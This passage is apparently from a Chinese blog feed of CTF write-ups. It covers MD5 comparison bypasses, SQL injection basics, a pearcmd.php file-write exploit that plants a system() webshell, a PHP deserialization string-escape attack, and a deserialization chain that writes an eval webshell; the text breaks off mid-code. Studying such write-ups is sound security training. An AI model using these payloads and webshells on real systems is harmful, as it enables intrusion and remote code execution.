href="https://blog.csdn.net/wangyuxiang946/article/details/119845182">MD5加密漏洞(MD5绕过方式-0e绕过/数组绕过/MD5碰撞/MD5SQL注入)_wangyuxiang946的博客-CSDN博客_md5数组绕过</a></p><p>0e绕过记录其中一种</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>) == <span class="hljs-title">md5</span>(<span class="hljs-number">240610708</span>)</span><br></code></pre></td></tr></table></figure><p>做[BJDCTF 2020]easy_md5 这题偶然发现新的一种绕过方式</p><p>首先题目是一个输入框，排除sql注入后</p><p>抓包看见</p><p><img src="/2022/01/20/2022/1/notes/image-20220207204008096.png" alt="image-20220207204008096"></p><p>然后我之前想的太简单了，以为可以直接条件为真，其实还是要构造的</p><p>md5函数</p><p><img src="/2022/01/20/2022/1/notes/image-20220207204311973.png" alt="image-20220207204311973"></p><p>要达成md5后的值与前面语句拼接可以如下图</p><p><img src="/2022/01/20/2022/1/notes/image-20220207204231387.png" alt="image-20220207204231387"></p><p>然后是大佬的推理思路：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">那我们从正向推算一下，要怎么得到我们要的答案。首先我们要找到一个字符串，这个字符串经过md5得到的<span class="hljs-number">16</span>位原始二进制的字符串能帮我们实现sql注入。首先<span class="hljs-keyword">or</span>这个字符串是必要的，同时为了配对原先sql语句里面有的单引号<br><br> 在<span class="hljs-keyword">or</span>的两边要有单引号，使它变成  password=‘xxx’<span class="hljs-keyword">or</span>‘xxx’  的形式，所以我们需要的字符串的原始二进制格式的字符串里要包含    ‘<span class="hljs-keyword">or</span>’    ，如果根据原始二进制来找到我们要的字符串可能会比较麻烦，那么可以根据<span class="hljs-number">32</span>位<span class="hljs-number">16</span>进制的字符串来查找，根据上面介绍的，  ‘<span class="hljs-keyword">or</span>’   对应的<span class="hljs-number">16</span>进制是   <span class="hljs-number">276f</span>7227    ，所以我们的目标就是要找一个字符串取<span class="hljs-number">32</span>位<span class="hljs-number">16</span>进制的md5值里带有<span class="hljs-number">276f</span>7227这个字段的，接着就是要看关键的数字部分了，在<span class="hljs-number">276f</span>7227这个字段后面紧跟一个数字，除了<span class="hljs-number">0</span>，<span class="hljs-number">1</span><span class="hljs-number">-9</span>，对应的asc码值是<span class="hljs-number">49</span><span class="hljs-number">-57</span>，转化为<span class="hljs-number">16</span>进制就是<span class="hljs-number">31</span><span class="hljs-number">-39</span>，也就是我们需要有<span class="hljs-number">276f</span>7227+（<span class="hljs-number">31</span><span class="hljs-number">-39</span>）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（<span class="hljs-number">31</span><span class="hljs-number">-39</span>）xxxxxx<br></code></pre></td></tr></table></figure><p>直观来看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">content: <span class="hljs-number">129581926211651571912466741651878684928</span><br>hex: <span class="hljs-number">06</span>da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo<span class="hljs-comment">#\xdf\xc1&#x27;or&#x27;8</span><br>string: T0Do<span class="hljs-comment">#&#x27;or&#x27;8</span><br>————————————————<br>版权声明：本文为CSDN博主「March97」的原创文章，遵循CC <span class="hljs-number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/March97/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81222922</span><br></code></pre></td></tr></table></figure><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>首先基本指令过一过</p><p>show databases;</p><p>show tables;</p><p>增删查改</p><p>增</p><p>insert into 表名 values(value1,value2,value3….);</p><p>insert into 表名(列名1，列名2，列名3……) values(value1,value2,value3….);</p><p><img src="/2022/01/20/2022/1/notes/image-20220208111931314.png" alt="image-20220208111931314"></p><p>删</p><p>delete  from 表名 where 某一列名 = value;</p><p><img src="/2022/01/20/2022/1/notes/image-20220208112056657.png" alt="image-20220208112056657"></p><p>改</p><p>update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]</p><p><img src="/2022/01/20/2022/1/notes/image-20220208111956741.png" alt="image-20220208111956741"></p><p>查</p><p>多种方式，缓慢更新。</p><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p><a href="https://www.gem-love.com/2022/01/26/%E4%B8%80%E6%96%87%E6%90%9E%E5%AE%9AMySQL%E7%9B%B2%E6%B3%A8/">一文搞定MySQL盲注 - 颖奇L’Amore (gem-love.com)</a></p><p>substr函数，会返回字符串的一部分</p><p>可以有三个参数，substr（string，start，length）</p><p><img src="/2022/01/20/2022/1/notes/image-20220206162008817.png" alt="image-20220206162008817"></p><p><img src="/2022/01/20/2022/1/notes/image-20220206162040957.png" alt="image-20220206162040957"></p><p>substr被禁时可以考虑mid</p><p><img src="/2022/01/20/2022/1/notes/image-20220206162137283.png" alt="image-20220206162137283"></p><p><img src="/2022/01/20/2022/1/notes/image-20220206162312685.png" alt="image-20220206162312685"></p><h2 id="绕过空格检测"><a href="#绕过空格检测" class="headerlink" title="绕过空格检测"></a>绕过空格检测</h2><p>1.注释符绕过/**/</p><p>2.括号绕过空格()</p><p><img src="/2022/01/20/2022/1/notes/image-20220209121548440.png" alt="image-20220209121548440"></p><p><img src="/2022/01/20/2022/1/notes/image-20220209122044457.png" alt="image-20220209122044457"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯</title>
      <link href="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
      <url>/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>没想到直接出了一题找框架漏洞的。。</p><p>赛后根据wp复现下，靶机环境为buu</p><p>参考文章：<a href="https://mp.weixin.qq.com/s?srcid=11155a0DnDB8fsa6xlkV96EQ&scene=23&sharer_sharetime=1636954278368&mid=2247492365&sharer_shareid=f8efe04553108c0c98c8d775270a22ec&sn=9918645f186a2ef9c11957ed4949c27b&idx=1&__biz=MzU2NDY2OTU4Nw==&chksm=fc45def1cb3257e72196a404a9e9ea9f58d658d9d6fa4acd2a5d20c0fa380af6a2cf510f0b4e&mpshare=1#rd">第七届“湖湘杯”网络安全技能大赛WP (qq.com)</a></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191742538.png" alt="image-20211117191742538"></p><p>左上角有一段代码</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191827188.png" alt="image-20211117191827188"></p><p>定义一个类，类中有变量name和value</p><p>这里看不出什么大概，于是去官网上下载了一个相近版本的源码</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192036759.png" alt="image-20211117192036759"></p><p>接下来就是代码审计</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192235252.png" alt="image-20211117192235252"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assign</span>(<span class="hljs-params">$name, $value = <span class="hljs-literal">null</span></span>) </span>&#123;<br>\wiphp\View::assign($name, $value);<br>&#125;<br></code></pre></td></tr></table></figure><p>在hepler.php中找到name和value作为可控变量，那么这里就是切入点</p><p>跟进</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192404636.png" alt="image-20211117192404636"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assign</span>(<span class="hljs-params">$name, $value = <span class="hljs-literal">null</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> ($name != <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-built_in">self</span>::$vars[$name] = $value;<br>&#125; <br></code></pre></td></tr></table></figure><p>再根据view函数</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192539051.png" alt="image-20211117192539051"></p><p>跟进</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192819699.png" alt="image-20211117192819699"></p><p>发现变量覆盖</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192920609.png" alt="image-20211117192920609"></p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192938954.png" alt="image-20211117192938954"></p><p>利用漏洞，</p><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?name=cfile&amp;+config-create+<span class="hljs-regexp">/&amp;value=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;<span class="hljs-regexp">/&lt;?=var_dump(system($_GET[1]));?&gt;+/</span>tmp/xq2.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193028604.png" alt="image-20211117193028604"></p><p>写入之后就是命令执行了</p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193132293.png" alt="image-20211117193132293"></p><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193201288.png" alt="image-20211117193201288"></p><p>最后</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?name=cfile<span class="hljs-variable">&amp;value</span>=<span class="hljs-meta-keyword">/tmp/</span>xq2.txt<span class="hljs-variable">&amp;1</span>=cat%<span class="hljs-number">20</span>/flag32897328937298hdwidh<br></code></pre></td></tr></table></figure><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193320690.png" alt="image-20211117193320690"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php字符串逃逸</title>
      <link href="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
      <url>/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p> 今天也是写了好多道web题，感觉bugku上的两题ssti有点坑，一直说我的pin是错的</p><p>咳咳，回到正题，写一下newphp题目，这题有关字符串反序列化逃逸</p><p><a href="https://www.cnblogs.com/c0d1/p/14900076.html">bugku-newphp - c0d1 - 博客园 (cnblogs.com)</a></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php版本:5.4.44</span><br>header(<span class="hljs-string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $hint;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$hint</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hint = $hint;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;hint===<span class="hljs-string">&quot;hint.php&quot;</span>)<br>            @<span class="hljs-keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="hljs-keyword">$this</span>-&gt;hint)); <br>        var_dump(<span class="hljs-keyword">$this</span>-&gt;hint);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hint != <span class="hljs-string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; <br>            <span class="hljs-comment">//There&#x27;s a hint in ./hint.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;hint = <span class="hljs-string">&quot;╰(●’◡’●)╮&quot;</span>; <br>        &#125; <br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $username;<br>    <span class="hljs-keyword">public</span> $password;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username, $password</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = $username;<br>        <span class="hljs-keyword">$this</span>-&gt;password = $password;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> $tmp;<br>    $data = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $data);<br>    $tmp = $data;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> $tmp;<br>    $data = $tmp;<br>    $r = str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), $data);<br>    <span class="hljs-keyword">return</span> $r;<br>&#125;<br><br>$tmp = <span class="hljs-string">&quot;test&quot;</span>;<br>$username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>$a = serialize(<span class="hljs-keyword">new</span> User($username, $password));<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/flag/is&#x27;</span>,$a))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NoNoNo!&quot;</span>);<br><br>unserialize(read(write($a)));<br><br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>很容易通过代码审计知道，我们要通过触发evil类来达到访问hint.php的目的</p><p>但是evil类是没有传参数据的，所以需要触发User类来传递数据</p><p>绕开wakeup函数</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028202324364.png" alt="image-20211028202324364"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;evil&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;hint&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;hint.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>上面这段就是我们要注入的payload</p><p>用User类触发就是</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029182637091.png" alt="image-20211029182637091"></p><p>得到</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029182704445.png" alt="image-20211029182704445"></p><p>现在的问题就是，反序列化时字符长度固定的情况下，我们要怎么注入想要的属性</p><p>这时候我们要替换的就是”;s:8:”password”;s:41:”，总共23位</p><p>之前的read和write的方法会对字符串进行替换，而chr(0)*chr(0)s是三个字符，\0\0\0\是六个字符，</p><p>每增加一组的\0\0\0就会吞掉三个字符，即多出三个位置给后面。</p><p>我们可以在password的值上再加一个任意字符，即可凑齐24个，那么\0\0\0就是八组</p><p>那这样我们就可以尝试注入了</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203903753.png" alt="image-20211028203903753"></p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028203932607.png" alt="image-20211028203932607"></p><p>访问index.cgi</p><p>存在ssrf</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204012795.png" alt="image-20211028204012795"></p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211028204157176.png" alt="image-20211028204157176"></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了serialize函数之后，要是放在序列化之前应该就不会产生这个问题</p><p><a href="https://blog.csdn.net/dengyu810/article/details/103213750">https://blog.csdn.net/dengyu810/article/details/103213750</a></p><p>再来刚才那题，我为了验证下正确性，将username里的字符变成2倍，然后通过前面要替换为23位</p><p>就用24x2得到的48位减去23位得到25位，为了避免覆盖payload我们就增添25位</p><p>记住，这里是6-&gt;3，\0的2位替换成1位的*，所以计算的时候要注意，都是以被替换成后来计算的</p><p><img src="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/image-20211029185728645.png" alt="image-20211029185728645"></p><p>测试之后照样打得通</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天翼杯 2021 esay_eval</title>
      <link href="/2021/10/26/2021/ctf/1/"/>
      <url>/2021/10/26/2021/ctf/1/</url>
      
        <content type="html"><![CDATA[<p> 题目标签：<strong>反序列化、主从复制、RCE、redis</strong></p><p>文章学习：<a href="http://pipinstall.cn/2020/12/08/Redis%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/">Redis攻击简单总结 - ttpfx’s blog (pipinstall.cn)</a></p><p>开启靶机是代码展现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method,$args</span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;a-&gt;a();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;<br>    preg_match_all(<span class="hljs-string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,$_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>],$ret);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($ret[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">foreach</span> ($ret[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> $i) &#123;<br>            <span class="hljs-keyword">if</span>(intval($i)!==<span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;you want to bypass wakeup ? no !&quot;</span>);<br>            &#125;<br>        &#125;<br>        unserialize($_REQUEST[<span class="hljs-string">&#x27;poc&#x27;</span>]);    <br>    &#125;<br><br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>很快地分析到，我们要构造eval语句，并且要绕过wakeup函数</p><p>而且会对传入的参数做一个正则匹配，匹配A类和B类名字后面的数目，要求必须为1</p><p>师傅wp说可以通过php对类名大小写不敏感的特性绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> a();<br>执行成功，然后会发现 disable_functions 有过滤，利用fputs写入一句话木马<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> b());<br><span class="hljs-comment">#O:1:&quot;b&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">#改成O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>看到phpinfo</p><p>查看<strong>disable_functions</strong></p><p><img src="/2021/10/26/2021/ctf/1/image-20211026195539415.png" alt="image-20211026195539415"></p><p>过滤的函数中，明显有执行函数</p><p>师傅的木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br><span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;code =<br><span class="hljs-string">&quot;fputs(fopen(&#x27;dotast.php&#x27;,&#x27;w&#x27;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ</span><br><span class="hljs-string">10pOw==\&quot;));&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> a();<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> b());<br><br></code></pre></td></tr></table></figure><p>这里我参考另外一篇文章<a href="https://blog.csdn.net/m0_56059226/article/details/120603390">2021 天翼杯easy_eval_m0_56059226的博客-CSDN博客</a>连接蚁剑，因为用上面这个payload我没成功==</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $code = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;eval(\$_REQUEST[1]);&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">new</span> A();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> 